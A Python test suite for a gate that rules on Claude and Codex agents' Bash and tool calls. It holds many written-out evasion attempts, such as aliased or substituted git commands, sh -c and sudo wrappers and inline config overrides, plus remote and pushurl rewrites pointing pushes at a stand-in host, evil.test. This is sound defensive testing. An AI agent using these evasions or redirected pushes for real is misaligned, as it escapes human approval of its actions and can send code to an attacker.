#!/usr/bin/env python3
"""AgenticOps 场景测试：验证标准 Gate 与 Claude/Codex Adapter 语义一致。

运行：python3 tests/test_gate.py
无第三方依赖。若本机存在 opa，会额外做 Python 评估器与 Rego 的一致性校验。
"""
from __future__ import annotations

import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
CLAUDE_HOOK = ROOT / "adapters" / "agents" / "claude" / "hook.py"
CODEX_HOOK = ROOT / "adapters" / "agents" / "codex" / "hook.py"
GATE_RUNNER = ROOT / "gate" / "runner.py"
sys.path.insert(0, str(ROOT))
from gate import engine  # noqa: E402
from workflow import task_store  # noqa: E402

PASS = 0
FAIL = 0


def check(name, actual, expected):
    global PASS, FAIL
    ok = actual == expected
    PASS += ok
    FAIL += not ok
    mark = "PASS" if ok else "FAIL"
    print("[%s] %-58s -> %s (期望 %s)" % (mark, name, actual, expected))


def run_hook(tool_name, tool_input, cwd, env_extra=None):
    out = run_hook_output(tool_name, tool_input, cwd, env_extra)
    hso = out.get("hookSpecificOutput")
    return hso["permissionDecision"] if hso else "passthrough"


def run_hook_output(tool_name, tool_input, cwd, env_extra=None):
    payload = {
        "hook_event_name": "PreToolUse",
        "tool_name": tool_name,
        "tool_input": tool_input,
        "cwd": str(cwd),
    }
    env = dict(os.environ)
    if env_extra:
        env.update(env_extra)
    proc = subprocess.run(
        [sys.executable, str(CLAUDE_HOOK)],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        env=env,
        timeout=30,
    )
    assert proc.returncode == 0, proc.stderr
    out = json.loads(proc.stdout)
    return out


def run_codex(tool_name, tool_input, cwd):
    out = run_codex_output(tool_name, tool_input, cwd)
    if out is None:
        return "allow"
    return out["hookSpecificOutput"]["permissionDecision"]


def run_codex_output(tool_name, tool_input, cwd):
    payload = {
        "hook_event_name": "PreToolUse",
        "tool_name": tool_name,
        "tool_input": tool_input,
        "cwd": str(cwd),
    }
    proc = subprocess.run(
        [sys.executable, str(CODEX_HOOK)],
        input=json.dumps(payload),
        capture_output=True,
        text=True,
        timeout=30,
    )
    assert proc.returncode == 0, proc.stderr
    if not proc.stdout.strip():
        return None
    out = json.loads(proc.stdout)
    output = out.get("hookSpecificOutput")
    assert output and output["hookEventName"] == "PreToolUse", out
    return out


def run_standard(request, env_extra=None):
    env = dict(os.environ)
    if env_extra:
        env.update(env_extra)
    proc = subprocess.run(
        [sys.executable, str(GATE_RUNNER)],
        input=json.dumps(request),
        capture_output=True,
        text=True,
        env=env,
        timeout=30,
    )
    assert proc.returncode == 0, proc.stderr
    return json.loads(proc.stdout)


def make_workspace(branch="feature/TAP-123", origin="git@github.com:acme/widget.git"):
    ws = Path(tempfile.mkdtemp(prefix="aogate-ws-"))
    subprocess.run(["git", "init", "-q", "-b", branch], cwd=ws, check=True)
    subprocess.run(["git", "remote", "add", "origin", origin], cwd=ws, check=True)
    (ws / ".agenticops").mkdir()
    product_root = ws / ".agenticops" / "test-product-root"
    shutil.copytree(ROOT / "projects", product_root / "projects")
    catalog_path = product_root / "projects" / "tapdata" / "repositories.json"
    catalog = json.loads(catalog_path.read_text(encoding="utf-8"))
    for repository in ("acme/widget", "acme/service-api", "acme/other-repo"):
        catalog["repositories"][repository] = {
            "origin": "git@github.com:%s.git" % repository,
            "baseline_branch": "develop",
            "dev_branch": "develop",
            "domains": ["test"],
        }
    catalog_path.write_text(json.dumps(catalog), encoding="utf-8")
    (ws / ".agenticops" / "workspace.json").write_text(
        json.dumps({
            "schema_version": 1, "product_root": str(product_root),
            "project": "tapdata", "agents": ["claude", "codex"],
        }), encoding="utf-8"
    )
    (ws / "README.md").write_text("poc\n", encoding="utf-8")
    subprocess.run(["git", "add", "."], cwd=ws, check=True)
    subprocess.run(
        ["git", "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "init"],
        cwd=ws,
        check=True,
    )
    return ws


def grant(ws, **overrides):
    target_repo = overrides.get("target_repo", "acme/widget")
    repositories = [{
        "repository": target_repo,
        "authorized_endpoint": overrides.get(
            "authorized_endpoint", "github.com/%s" % target_repo
        ),
        "work_branch": overrides.get("work_branch", "feature/TAP-123"),
        "base_branch": "develop",
        "base_sha": "1" * 40,
        "approved_scope": "v1 测试范围",
        "verification_method": "python3 tests/test_gate.py",
        "pull_request": None,
        "ci": None,
    }]
    repositories.extend(overrides.get("extra_repositories", []))
    issue = overrides.get("issue_key", "TAP-123")
    task_store.register(ws, issue, status="active")
    gate = task_store.task_directory(ws, issue)
    gate.mkdir(parents=True, exist_ok=True)
    task_store.task_path(ws, issue).write_text(
        json.dumps({
            "issue_key": issue,
            "run_id": "run-" + ("1" if issue == "TAP-123" else "9") * 12,
            "task_class": "defect_fix",
            "stage": "design_review",
            "facts": {},
            "repositories": repositories,
            "pending": None,
            "history": [],
        }),
        encoding="utf-8",
    )
    subprocess.run(
        [
            sys.executable, str(ROOT / "workflow" / "authorization.py"), "grant",
            "--issue-key", issue,
            "--agent-id", "dev-bot-1",
            "--plan-version", "v1",
            "--dir", str(ws),
        ],
        check=True,
        capture_output=True,
    )


def make_git_repository(path):
    path.mkdir(parents=True)
    subprocess.run(["git", "init", "-q", "-b", "feature/TAP-123"], cwd=path, check=True)
    subprocess.run(["git", "remote", "add", "origin", "git@github.com:acme/widget.git"], cwd=path, check=True)
    (path / "README.md").write_text("task worktree\n", encoding="utf-8")
    subprocess.run(["git", "add", "README.md"], cwd=path, check=True)
    subprocess.run(
        ["git", "-c", "user.email=t@t", "-c", "user.name=t", "commit", "-qm", "init"],
        cwd=path,
        check=True,
    )
    return path


def prepare_task_worktree(ws, issue_key="TAP-123"):
    state_path = task_store.task_path(ws, issue_key)
    task = json.loads(state_path.read_text(encoding="utf-8"))
    worktree = make_git_repository(
        ws / ".agenticops" / "worktrees" / issue_key / task["run_id"] / "acme" / "widget"
    )
    task["repositories"][0]["worktree"] = {"status": "prepared", "path": str(worktree)}
    state_path.write_text(json.dumps(task), encoding="utf-8")
    return worktree


def main():
    ws = make_workspace()
    try:
        invalid = run_standard({})
        check("无效标准请求保守拒绝", invalid["decision"], "deny")
        unknown = run_standard({
            "protocol_version": 1,
            "event": "before_operation",
            "source": {"agent": "test", "adapter": "test", "adapter_version": 1},
            "cwd": str(ws),
            "operations": ["future_external_write"],
        })
        check("未知标准操作转人工", unknown["decision"], "ask")
        with tempfile.TemporaryDirectory(prefix="agenticops-product-root-") as temporary:
            product_root = Path(temporary)
            (product_root / ".agentic-ops-source").write_text("source\n", encoding="utf-8")
            source_decision = run_standard({
                "protocol_version": 1,
                "event": "before_operation",
                "source": {"agent": "test", "adapter": "test", "adapter_version": 1},
                "cwd": str(product_root),
                "operations": ["unknown_external_write"],
            })
            check("源码产品根目录门禁仍执行", source_decision["decision"], "ask")
            check("源码产品根目录审计进入 .local", (product_root / ".local/gate/events.jsonl").is_file(), True)
            check("源码产品根目录不生成工作空间状态", (product_root / ".agenticops").exists(), False)

        # ---- 未授权阶段 -------------------------------------------------
        check("只读 bash（git status）不受控", run_hook("Bash", {"command": "git status"}, ws), "passthrough")
        check("重定向上下文的已知只读 Git 核验不受控", run_hook("Bash", {"command": "git -C /other rev-parse HEAD"}, ws), "passthrough")
        check("git-dir 下的已知只读 Git 核验不受控", run_hook("Bash", {"command": "git --git-dir=/other/repo.git log -1"}, ws), "passthrough")
        check("只读 git -c 核验不受控", run_hook("Bash", {"command": "git -c color.ui=false status --short"}, ws), "passthrough")
        check("重定向上下文的未知 Git 子命令停止", run_hook("Bash", {"command": "git -C /other unknown-subcommand"}, ws), "ask")
        check("未知 Git alias 子命令停止", run_hook("Bash", {"command": "git ship feature/TAP-123"}, ws), "ask")
        check("变量展开的命令位停止", run_hook("Bash", {"command": "G=git; $G push origin feature/TAP-123"}, ws), "ask")
        check("带引号变量别名仍停止", run_hook("Bash", {"command": "G='git'; \"$G\" push origin feature/TAP-123"}, ws), "ask")
        check("路径变量别名仍停止", run_hook("Bash", {"command": "P=/usr/bin/git; $P push origin feature/TAP-123"}, ws), "ask")
        check("未解析的变量命令位交还 Agent 原生权限", run_hook("Bash", {"command": "${G} push origin feature/TAP-123"}, ws), "passthrough")
        check("换行后的保护分支 push 不得漏检", run_hook("Bash", {"command": "git status\ngit push origin main"}, ws), "deny")
        check("后台分隔后的强推仍被识别", run_hook("Bash", {"command": "git status & git push -f origin feature/TAP-123"}, ws), "deny")
        check("Shell if 控制结构保守停止", run_hook("Bash", {"command": "if git status; then git push origin feature/TAP-123; fi"}, ws), "ask")
        check("sh -c 子 Shell 保守停止", run_hook("Bash", {"command": "sh -c 'git push origin feature/TAP-123'"}, ws), "ask")
        check("sudo 包装器保守停止", run_hook("Bash", {"command": "sudo git push origin feature/TAP-123"}, ws), "ask")
        check("Jira 评论（free）放行", run_hook("mcp__atlassian__add_comment", {"issueKey": "TAP-123"}, ws), "allow")
        check("无授权时 git commit 需确认", run_hook("Bash", {"command": "git commit -m 'x'"}, ws), "ask")
        check("无授权时 git push 需确认", run_hook("Bash", {"command": "git push origin feature/TAP-123"}, ws), "ask")
        check("无授权时 Jira transition 需确认", run_hook("mcp__atlassian__transition_issue", {"issueKey": "TAP-123"}, ws), "ask")
        check(
            "没有 active 任务时受控 prepare 暂停",
            run_hook(
                "Bash",
                {"command": "python3 workflow/task.py repository prepare --issue-key TAP-123"},
                ws,
            ),
            "ask",
        )
        task_store.register(ws, "TAP-123", status="active")
        check(
            "active 任务受控 prepare 自动放行",
            run_hook(
                "Bash",
                {"command": "python3 workflow/task.py repository prepare --issue-key TAP-123"},
                ws,
            ),
            "allow",
        )
        check(
            "直接入口与小写 issue key 仍绑定 active 任务",
            run_hook(
                "Bash",
                {"command": "workflow/task.py repository prepare --issue-key tap-123"},
                ws,
            ),
            "allow",
        )
        check(
            "重复同值 issue key 的 prepare 停止",
            run_hook(
                "Bash",
                {"command": "workflow/task.py repository prepare --issue-key TAP-123 --issue-key=TAP-123"},
                ws,
            ),
            "ask",
        )
        check(
            "重复异值 issue key 的 prepare 停止",
            run_hook(
                "Bash",
                {"command": "workflow/task.py repository prepare --issue-key=TAP-123 --issue-key TAP-999"},
                ws,
            ),
            "ask",
        )
        check(
            "重复 dir 的 prepare 停止",
            run_hook(
                "Bash",
                {"command": "workflow/task.py repository prepare --dir ws-a --issue-key TAP-123 --dir=ws-b"},
                ws,
            ),
            "ask",
        )
        check(
            "受控 prepare 必须显式指定 issue key",
            run_hook(
                "Bash",
                {"command": "python3 workflow/task.py repository prepare"},
                ws,
            ),
            "ask",
        )
        check(
            "复用已有分支仍需人工确认",
            run_hook(
                "Bash",
                {"command": "python3 workflow/task.py repository prepare --issue-key TAP-123 --reuse-existing-branch"},
                ws,
            ),
            "ask",
        )
        check(
            "repository cleanup 仍需人工确认",
            run_hook(
                "Bash",
                {"command": "python3 workflow/task.py repository cleanup --issue-key TAP-123"},
                ws,
            ),
            "ask",
        )
        check("直接 git worktree add 需人工确认", run_hook("Bash", {"command": "git worktree add /tmp/x"}, ws), "ask")
        check("直接 git clone 需人工确认", run_hook("Bash", {"command": "git clone git@example.test:a/b.git"}, ws), "ask")
        check("直接 git fetch 需人工确认", run_hook("Bash", {"command": "git fetch origin develop"}, ws), "ask")
        check("直接 repository_worktree prepare 需人工确认", run_hook("Bash", {"command": "workflow/repository_worktree.py prepare --issue-key TAP-123"}, ws), "ask")
        check("直接 task purge 需人工确认", run_hook("Bash", {"command": "workflow/task.py purge --issue-key TAP-123 --yes"}, ws), "ask")
        check("python task purge 需人工确认", run_hook("Bash", {"command": "python3 workflow/task.py purge --issue-key TAP-123 --yes"}, ws), "ask")
        check("python -m task purge 仍需人工确认", run_hook("Bash", {"command": "python3 -m workflow.task purge --issue-key TAP-123 --yes"}, ws), "ask")
        check("紧凑 python -m task purge 仍需人工确认", run_hook("Bash", {"command": "python3 -mworkflow.task purge --issue-key TAP-123 --yes"}, ws), "ask")
        check("python -m repository_worktree prepare 仍需人工确认", run_hook("Bash", {"command": "python3 -m workflow.repository_worktree prepare --issue-key TAP-123"}, ws), "ask")
        check("python -m task 受控 prepare 放行", run_hook("Bash", {"command": "python3 -m workflow.task repository prepare --issue-key tap-123"}, ws), "allow")
        check("未知 Python 模块交还 Agent 原生权限", run_hook("Bash", {"command": "python3 -m workflow.other purge --issue-key TAP-123 --yes"}, ws), "passthrough")
        check("Python -c 内联执行交还 Agent 原生权限", run_hook("Bash", {"command": "python3 -c 'print(1)'"}, ws), "passthrough")
        check("Python stdin 执行交还 Agent 原生权限", run_hook("Bash", {"command": "python3 -"}, ws), "passthrough")
        check("未登记 Python 脚本交还 Agent 原生权限", run_hook("Bash", {"command": "python3 unregistered.py"}, ws), "passthrough")
        check("Perl 内联执行交还 Agent 原生权限", run_hook("Bash", {"command": "perl -we 'print 1'"}, ws), "passthrough")
        check("Perl 脚本文件交还 Agent 原生权限", run_hook("Bash", {"command": "perl payload.pl"}, ws), "passthrough")
        check("Ruby 内联执行交还 Agent 原生权限", run_hook("Bash", {"command": "ruby -e 'puts 1'"}, ws), "passthrough")
        check("Ruby 脚本文件交还 Agent 原生权限", run_hook("Bash", {"command": "ruby payload.rb"}, ws), "passthrough")
        check("Node 内联执行交还 Agent 原生权限", run_hook("Bash", {"command": "node --eval='console.log(1)'"}, ws), "passthrough")
        check("Node 脚本文件交还 Agent 原生权限", run_hook("Bash", {"command": "node payload.js"}, ws), "passthrough")
        check("nodejs 内联执行交还 Agent 原生权限", run_hook("Bash", {"command": "nodejs -e 'console.log(1)'"}, ws), "passthrough")
        check("nodejs 脚本文件交还 Agent 原生权限", run_hook("Bash", {"command": "nodejs payload.js"}, ws), "passthrough")
        check("Python 只读版本查询不受控", run_hook("Bash", {"command": "python3 --version"}, ws), "passthrough")
        check("nodejs 只读版本查询不受控", run_hook("Bash", {"command": "nodejs --version"}, ws), "passthrough")
        check("带值 Python 长选项后的 purge 仍需人工确认", run_hook("Bash", {"command": "python3 --check-hash-based-pycs always workflow/task.py purge --issue-key TAP-123 --yes"}, ws), "ask")
        check("git message 值 --help 不旁路 commit", run_hook("Bash", {"command": "git commit -m --help"}, ws), "ask")
        check("gh title 值 --help 不旁路建 PR", run_hook("Bash", {"command": "gh pr create --title --help"}, ws), "ask")
        check("git 真实 help 不受控", run_hook("Bash", {"command": "git commit -a --help"}, ws), "passthrough")
        check("gh 真实 help 不受控", run_hook("Bash", {"command": "gh pr create --draft --help"}, ws), "passthrough")
        check("task repository --help 不误拦", run_hook("Bash", {"command": "python3 workflow/task.py repository prepare --help"}, ws), "passthrough")
        check("repository context 不误拦", run_hook("Bash", {"command": "python3 workflow/task.py repository context --issue-key TAP-123 --json"}, ws), "passthrough")
        check("只读检查工作空间根入口不误拦", run_hook("Bash", {"command": "sed -n '1,200p' ./agenticops"}, ws), "passthrough")
        check("sed 原地修改工作空间入口停止", run_hook("Bash", {"command": "sed -n 1p -i.bak ./agenticops"}, ws), "ask")
        check("重定向覆盖工作空间入口停止", run_hook("Bash", {"command": "cat source > ./agenticops"}, ws), "ask")
        check("管道执行工作空间入口停止", run_hook("Bash", {"command": "cat ./agenticops | sh -s workspace purge --yes"}, ws), "ask")
        check("rg 预处理执行工作空间入口停止", run_hook("Bash", {"command": "rg --pre './agenticops workspace purge --yes' x ./agenticops"}, ws), "ask")
        check("命令替换执行工作空间入口停止", run_hook("Bash", {"command": "head -n \"$(./agenticops workspace purge --yes)\" ./agenticops"}, ws), "ask")
        check("rg 配置预处理执行工作空间入口停止", run_hook("Bash", {"command": "RIPGREP_CONFIG_PATH=/tmp/rg.conf rg x ./agenticops"}, ws), "ask")
        check("repository roots 不误拦", run_hook("Bash", {"command": "python3 workflow/repository_worktree.py roots --issue-key TAP-123"}, ws), "passthrough")
        check("execution-root 不误拦", run_hook("Bash", {"command": "python3 workflow/repository_worktree.py execution-root --issue-key TAP-123"}, ws), "passthrough")
        check("Atlassian 当前用户只读查询不误拦", run_hook("mcp__atlassian__atlassianUserInfo", {}, ws), "passthrough")

        target_ws = make_workspace()
        try:
            task_store.register(target_ws, "TAP-777", status="active")
            check(
                "绝对 --dir 按目标工作空间解析 active 任务",
                run_hook(
                    "Bash",
                    {"command": "python3 workflow/task.py repository prepare --issue-key tap-777 --dir %s" % target_ws},
                    ws,
                ),
                "allow",
            )
            relative_target = os.path.relpath(target_ws, ws)
            check(
                "相对 --dir 按 Hook cwd 解析目标工作空间",
                run_hook(
                    "Bash",
                    {"command": "python3 workflow/task.py repository prepare --issue-key TAP-777 --dir %s" % relative_target},
                    ws,
                ),
                "allow",
            )
            check(
                "前置只读 Workflow segment 不污染 prepare target",
                run_hook(
                    "Bash",
                    {"command": "workflow/task.py status --issue-key TAP-999 --dir wsA && workflow/task.py repository prepare --issue-key tap-777 --dir %s" % target_ws},
                    ws,
                ),
                "allow",
            )
            check(
                "跨工作空间不得借用 Hook cwd 的 active 任务",
                run_hook(
                    "Bash",
                    {"command": "python3 workflow/task.py repository prepare --issue-key TAP-123 --dir %s" % target_ws},
                    ws,
                ),
                "ask",
            )
            check(
                "复合 prepare 不得用单一 target 代表多个工作空间",
                run_hook(
                    "Bash",
                    {"command": "workflow/task.py repository prepare --issue-key TAP-123 && workflow/task.py repository prepare --issue-key TAP-777 --dir %s" % target_ws},
                    ws,
                ),
                "ask",
            )
            check(
                "目标工作空间 Gate 事件写入目标任务审计",
                task_store.events_path(target_ws, "TAP-777").is_file(),
                True,
            )
        finally:
            shutil.rmtree(target_ws, ignore_errors=True)

        unbound_target = Path(tempfile.mkdtemp(prefix="aogate-unbound-"))
        try:
            check(
                "未绑定目标工作空间停止 prepare",
                run_hook(
                    "Bash",
                    {"command": "workflow/task.py repository prepare --issue-key TAP-404 --dir %s" % unbound_target},
                    ws,
                ),
                "ask",
            )
            check(
                "Gate 不在未绑定目标目录创建审计状态",
                (unbound_target / ".agenticops").exists(),
                False,
            )
        finally:
            shutil.rmtree(unbound_target, ignore_errors=True)

        missing_auth = run_standard({
            "protocol_version": 1,
            "event": "before_operation",
            "source": {"agent": "test", "adapter": "test", "adapter_version": 1},
            "cwd": str(ws),
            "operations": ["git_commit"],
            "target": {"issue_key": "TAP-123"},
        })
        check("active 任务无授权使用独立原因码", missing_auth["reason_code"], "authorization_missing")
        check("无授权响应给出处理方式", bool(missing_auth.get("required_action")), True)

        authorization_path = task_store.task_directory(ws, "TAP-123") / "authorization.json"
        authorization_path.write_text("{}", encoding="utf-8")
        invalid_auth = run_standard({
            "protocol_version": 1,
            "event": "before_operation",
            "source": {"agent": "test", "adapter": "test", "adapter_version": 1},
            "cwd": str(ws),
            "operations": ["git_commit"],
            "target": {"issue_key": "TAP-123"},
        })
        check("无效授权使用独立原因码", invalid_auth["reason_code"], "authorization_invalid")
        authorization_path.unlink()

        no_task = run_standard({
            "protocol_version": 1,
            "event": "before_operation",
            "source": {"agent": "test", "adapter": "test", "adapter_version": 1},
            "cwd": str(ws),
            "operations": ["git_commit"],
            "target": {"issue_key": "TAP-999"},
        })
        check("无 active 任务使用独立原因码", no_task["reason_code"], "no_active_task")

        # ---- 签发授权后 -------------------------------------------------
        grant(ws)
        task_worktree = prepare_task_worktree(ws)
        check(
            "当前会话通过已绑定 git -C worktree commit 放行",
            run_hook("Bash", {"command": "git -C %s commit -m x" % task_worktree}, ws),
            "allow",
        )
        check(
            "当前会话通过已绑定 git -C worktree push 放行",
            run_hook(
                "Bash", {"command": "git -C %s push origin feature/TAP-123" % task_worktree}, ws
            ),
            "allow",
        )
        other_worktree = make_git_repository(ws / "other-worktree")
        check(
            "同仓同分支的其它 git -C 路径不得借用授权",
            run_hook("Bash", {"command": "git -C %s commit -m x" % other_worktree}, ws),
            "ask",
        )
        check("授权后 git commit 放行", run_hook("Bash", {"command": "git commit -m 'x'"}, ws), "allow")
        check("未配置独立 pushurl 时按 fetch URL 放行", run_hook("Bash", {"command": "git push origin feature/TAP-123"}, ws), "allow")
        rewrite_key = "url.git@evil.test:acme/widget.git.insteadOf"
        subprocess.run(
            [
                "git", "config", "--add", rewrite_key,
                "git@github.com:acme/widget.git",
            ],
            cwd=ws,
            check=True,
        )
        check(
            "insteadOf 同时改写 fetch/push 到异主机时拒绝",
            run_hook("Bash", {"command": "git push origin feature/TAP-123"}, ws),
            "deny",
        )
        subprocess.run(
            ["git", "config", "--unset-all", rewrite_key], cwd=ws, check=True
        )
        subprocess.run(
            [
                "git", "config", "--add", "remote.origin.url",
                "git@evil.test:acme/widget.git",
            ],
            cwd=ws,
            check=True,
        )
        check(
            "多个 raw remote.origin.url 时拒绝",
            run_hook("Bash", {"command": "git push origin feature/TAP-123"}, ws),
            "deny",
        )
        subprocess.run(
            ["git", "config", "--unset-all", "remote.origin.url"], cwd=ws, check=True
        )
        subprocess.run(
            ["git", "config", "--add", "remote.origin.url", "not-a-url"],
            cwd=ws,
            check=True,
        )
        check(
            "无法识别的 raw remote.origin.url 时拒绝",
            run_hook("Bash", {"command": "git push origin feature/TAP-123"}, ws),
            "deny",
        )
        subprocess.run(
            ["git", "config", "--unset-all", "remote.origin.url"], cwd=ws, check=True
        )
        subprocess.run(
            [
                "git", "config", "--add", "remote.origin.url",
                "git@github.com:acme/widget.git",
            ],
            cwd=ws,
            check=True,
        )
        subprocess.run(
            [
                "git", "remote", "set-url", "--add", "--push", "origin",
                "git@evil.test:acme/widget.git",
            ],
            cwd=ws,
            check=True,
        )
        check(
            "fetch 正常但实际 pushurl 指向其它仓库时拒绝",
            run_hook("Bash", {"command": "git push origin feature/TAP-123"}, ws),
            "deny",
        )
        subprocess.run(
            ["git", "config", "--unset-all", "remote.origin.pushurl"],
            cwd=ws,
            check=True,
        )
        subprocess.run(
            [
                "git", "remote", "set-url", "--add", "--push", "origin",
                "git@github.com:acme/widget.git",
            ],
            cwd=ws,
            check=True,
        )
        subprocess.run(
            [
                "git", "remote", "set-url", "--add", "--push", "origin",
                "git@evil.test:acme/widget.git",
            ],
            cwd=ws,
            check=True,
        )
        check(
            "origin 存在多个 pushurl 时拒绝",
            run_hook("Bash", {"command": "git push origin feature/TAP-123"}, ws),
            "deny",
        )
        subprocess.run(
            ["git", "config", "--unset-all", "remote.origin.pushurl"],
            cwd=ws,
            check=True,
        )
        subprocess.run(
            [
                "git", "remote", "set-url", "--add", "--push", "origin",
                "git@github.com:acme/widget.git",
            ],
            cwd=ws,
            check=True,
        )
        check("唯一且匹配授权的 pushurl 放行", run_hook("Bash", {"command": "git push origin feature/TAP-123"}, ws), "allow")
        subprocess.run(
            ["git", "config", "--unset-all", "remote.origin.pushurl"], cwd=ws, check=True
        )
        subprocess.run(
            ["git", "remote", "set-url", "origin", "git@evil.test:acme/widget.git"],
            cwd=ws,
            check=True,
        )
        check(
            "唯一 evil raw/fetch/push 同 slug 仍不匹配授权 endpoint",
            run_hook("Bash", {"command": "git push origin feature/TAP-123"}, ws),
            "deny",
        )
        subprocess.run(
            ["git", "remote", "set-url", "origin", "git@github.com:acme/widget.git"],
            cwd=ws,
            check=True,
        )
        check(
            "正常 GitHub fallback 四方 endpoint 放行",
            run_hook("Bash", {"command": "git push origin feature/TAP-123"}, ws),
            "allow",
        )
        authorization_path = task_store.authorization_path(ws, "TAP-123")
        original_authorization = json.loads(authorization_path.read_text(encoding="utf-8"))
        for label, endpoint in (
            ("缺失", None),
            ("空值", ""),
            ("多值", ["github.com/acme/widget", "evil.test/acme/widget"]),
            ("异 host", "evil.test/acme/widget"),
        ):
            malformed = json.loads(json.dumps(original_authorization))
            if endpoint is None:
                malformed["repositories"][0].pop("authorized_endpoint", None)
            else:
                malformed["repositories"][0]["authorized_endpoint"] = endpoint
            authorization_path.write_text(json.dumps(malformed), encoding="utf-8")
            check(
                "授权 endpoint %s时 push 失败关闭" % label,
                run_hook("Bash", {"command": "git push origin feature/TAP-123"}, ws),
                "deny",
            )
        legacy_authorization = json.loads(json.dumps(original_authorization))
        legacy_authorization["repositories"][0].pop("authorized_endpoint", None)
        authorization_path.write_text(json.dumps(legacy_authorization), encoding="utf-8")
        check(
            "旧授权缺 endpoint 的非 push 操作保持 v1 兼容",
            run_hook("Bash", {"command": "git commit -m x"}, ws),
            "allow",
        )
        authorization_path.write_text(
            json.dumps(original_authorization), encoding="utf-8"
        )
        subprocess.run(
            [
                "git", "remote", "set-url", "--add", "--push", "origin",
                "git@github.com:acme/widget.git",
            ],
            cwd=ws,
            check=True,
        )
        check("HEAD 推送授权工作分支放行", run_hook("Bash", {"command": "git push origin HEAD:feature/TAP-123"}, ws), "allow")
        check("完整 heads source 推送同名授权分支放行", run_hook("Bash", {"command": "git push origin refs/heads/feature/TAP-123"}, ws), "allow")
        check("push destination 越过授权分支时拒绝", run_hook("Bash", {"command": "git push origin HEAD:feature/TAP-999"}, ws), "deny")
        check("任意 source 不得写入授权分支", run_hook("Bash", {"command": "git push origin evil:feature/TAP-123"}, ws), "deny")
        check("push destination 禁止 tags namespace", run_hook("Bash", {"command": "git push origin HEAD:refs/tags/v1"}, ws), "deny")
        explicit_target_mismatch = run_standard({
            "protocol_version": 1,
            "event": "before_operation",
            "source": {"agent": "test", "adapter": "test", "adapter_version": 1},
            "cwd": str(ws),
            "operations": ["git_push"],
            "target": {
                "issue_key": "TAP-123",
                "repository": "evil/widget",
                "push_target_branch": "feature/TAP-123",
            },
        })
        check("push 请求目标不得覆盖 Git 实际 push URL", explicit_target_mismatch["decision"], "deny")
        check("push 仓库事实不可信使用独立原因码", explicit_target_mismatch["reason_code"], "untrusted_push_repository")
        missing_refspec = run_standard({
            "protocol_version": 1,
            "event": "before_operation",
            "source": {"agent": "test", "adapter": "test", "adapter_version": 1},
            "cwd": str(ws),
            "operations": ["git_push"],
            "target": {},
        })
        check("标准 git_push 缺少 refspec 事实时拒绝", missing_refspec["decision"], "deny")
        check("缺少 refspec 使用独立原因码", missing_refspec["reason_code"], "unauthorized_push_refspec")
        check("替代 remote 不得借用 origin 授权", run_hook("Bash", {"command": "git push upstream feature/TAP-123"}, ws), "ask")
        check("remote URL 不得借用 origin 授权", run_hook("Bash", {"command": "git push git@github.com:acme/widget.git feature/TAP-123"}, ws), "ask")
        check("remote path 不得借用 origin 授权", run_hook("Bash", {"command": "git push /tmp/widget.git feature/TAP-123"}, ws), "ask")
        check("push --repo 不得借用 origin 授权", run_hook("Bash", {"command": "git push --repo=origin feature/TAP-123"}, ws), "ask")
        check("副作用 git -c 必须停止", run_hook("Bash", {"command": "git -c color.ui=false push origin feature/TAP-123"}, ws), "ask")
        check("pushurl 配置覆盖必须停止", run_hook("Bash", {"command": "git -c remote.origin.pushurl=git@evil.test:acme/widget.git push origin feature/TAP-123"}, ws), "ask")
        check("Git config-env 副作用必须停止", run_hook("Bash", {"command": "git --config-env=remote.origin.pushurl=PUSH_URL push origin feature/TAP-123"}, ws), "ask")
        check("Git exec-path 副作用必须停止", run_hook("Bash", {"command": "git --exec-path=/custom/git push origin feature/TAP-123"}, ws), "ask")
        check("内联 alias 副作用必须停止", run_hook("Bash", {"command": "git -c alias.ship='push origin main' ship feature/TAP-123"}, ws), "ask")
        check("前置环境赋值不绕过 push 门禁", run_hook("Bash", {"command": "AO_MODE=test git push origin feature/TAP-123"}, ws), "allow")
        check("env 与 command 包装器不绕过 push 门禁", run_hook("Bash", {"command": "env AO_MODE=test command git push origin feature/TAP-123"}, ws), "allow")
        mixed_push = {"command": "git push origin feature/TAP-123 && git push origin main"}
        check("复合 push 不得共用首个 target 放行 main", run_hook("Bash", mixed_push, ws), "ask")
        check("Codex 复合 push 目标歧义时停止", run_codex("Bash", mixed_push, ws), "deny")
        check("复合同目标 push 正常合并", run_hook("Bash", {"command": "git push origin feature/TAP-123 && git push origin feature/TAP-123"}, ws), "allow")
        check("单段 push 多 ref 无法唯一表示时停止", run_hook("Bash", {"command": "git push origin feature/TAP-123 feature/TAP-124"}, ws), "ask")
        check("复合 push 缺少显式 target 时停止", run_hook("Bash", {"command": "git push origin && git push origin feature/TAP-123"}, ws), "ask")
        check("push 无显式 refspec 时停止", run_hook("Bash", {"command": "git push origin"}, ws), "ask")
        check("包装后的 push 无显式 refspec 仍停止", run_hook("Bash", {"command": "env AO_MODE=test git push origin"}, ws), "ask")
        check("push --delete 不得借用普通 push 授权", run_hook("Bash", {"command": "git push --delete origin feature/TAP-123"}, ws), "ask")
        check("push 空源删除 ref 必须停止", run_hook("Bash", {"command": "git push origin :feature/TAP-123"}, ws), "ask")
        check("push --prune 隐式删除必须停止", run_hook("Bash", {"command": "git push --prune origin feature/TAP-123"}, ws), "ask")
        check("push --follow-tags 隐式多 ref 必须停止", run_hook("Bash", {"command": "git push --follow-tags origin feature/TAP-123"}, ws), "ask")
        check("push 通配 refspec 隐式多 ref 必须停止", run_hook("Bash", {"command": "git push origin 'refs/heads/*:refs/heads/*'"}, ws), "ask")
        check("无法可靠剥离 env 时停止", run_hook("Bash", {"command": "env -S 'git push origin feature/TAP-123'"}, ws), "ask")
        check("动态命令替换不得拼出未分类命令", run_hook("Bash", {"command": "$(printf git) push origin feature/TAP-123"}, ws), "ask")
        check("env 后动态命令替换仍停止", run_hook("Bash", {"command": "env AO_MODE=test $(printf git) push origin feature/TAP-123"}, ws), "ask")
        check("工作空间外 git -C push 失败关闭", run_hook("Bash", {"command": "git -C /other push origin feature/TAP-123"}, ws), "deny")
        check("git --git-dir 不得借用原仓库授权", run_hook("Bash", {"command": "git --git-dir=/other/repo.git push origin feature/TAP-123"}, ws), "ask")
        check("git --work-tree 不得借用原工作树授权", run_hook("Bash", {"command": "git --work-tree=/other/tree push origin feature/TAP-123"}, ws), "ask")
        check("env -C 不得借用原 cwd 授权", run_hook("Bash", {"command": "env -C /other git push origin feature/TAP-123"}, ws), "ask")
